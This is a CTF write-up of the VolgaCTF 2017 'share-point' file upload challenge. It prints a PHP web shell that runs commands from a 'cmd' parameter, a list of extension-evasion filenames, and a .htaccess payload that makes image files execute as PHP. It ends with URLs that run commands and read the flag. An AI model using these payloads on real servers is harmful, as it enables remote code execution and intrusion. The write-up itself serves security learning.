<h3>Login</h3>

Weak authentication
After playing around with the credential fields you get some errors / warnings that tell you the requirements.

**User name:** Must be atleast 4 characters
**Password:** Any 8 characters. (If another user is logged in, as that username it may error and say wrong password).

<h3>File upload</h3>

Right away redirected to a file upload. Ok lets upload a picture and see what happens, upload freakazoid.png.  Can navigate to it and view the picture.  Notice everything is PHP. Great lets try a PHP file with command execution inside.

```
<?php
if (isset($_GET['cmd'])){
  print(shell_exec($_GET['cmd']));
}
```
PHP is blocked. Damn. Ok lets upload a PHP file, without a PHP extension.

Success, ok lets try a few different file extensions to understand what is happening.

* file.php.png [yes]
* file.png.php [no]
* file.php;png [yes]
* file.php%00.png [yes]
* file.php.php.png [yes]
* file.png.php.php [no]
* file.php.png123 [yes]
* file.png%00file.php [no]
* file.png' or 1=1# [no]
* file [yes]

For every file that successfully uploaded I tried to view them, and use `<url>?cmd=ls` to see if I could get the php to execute my commands. Nothing worked! 

I stumbled around for along time, but 2-3 more hours exploring fuctionality of sharing, exploring the `Content-type` field in the `POST` request using burp.  Tried LFI, directory traversal.

I openend some php file upload filter evasion links, and read them thoroughly, after playing with the `Content-type` a post about `.htaccess` file types caught my eye. I had NOT tried that. Let's try it.

I Create a blank file called `file.htaccess`. It uploaded! Ok the link said to upload the file `.htaccess` to the server and have the contents:

```
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
```

What does this do? the `AddType` in an `.htaccess` file can tell the webserver to run many other extensions types as PHP, one reason why `.html` files work with PHP inside of them.

Uploading `.htaccess` worked. I then uploaded my PHP code execution file (code above) as the file `file.png`. I navigated to the link from the Files section of the website.

`http://share-point.quals.2017.volgactf.ru/files/AAAA/kek.php.png`

I then added the parameter (again from the code above) `?cmd=` to the end to verify if PHP would execute.

`http://share-point.quals.2017.volgactf.ru/files/AAAA/kek.php.png?cmd=ls`

Success!!!!!!

`http://share-point.quals.2017.volgactf.ru/files/AAAA/kek.php.png?cmd=ls+-al'

Works!

Ok, lets just see if this works:

`http://share-point.quals.2017.volgactf.ru/files/AAAA/kek.php.png?cmd=locate flag`

Success again! Multiple results! The first is `/opt/flag.txt` lets see what is inside.

`http://share-point.quals.2017.volgactf.ru/files/AAAA/kek.php.png?cmd=cat%20/opt/flag.txt`

THE FLAG IS IN HERE!!!!


VolgaCTF{AnoTHer_apPro0Ach_to_file_Upl0Ad_with_PhP}
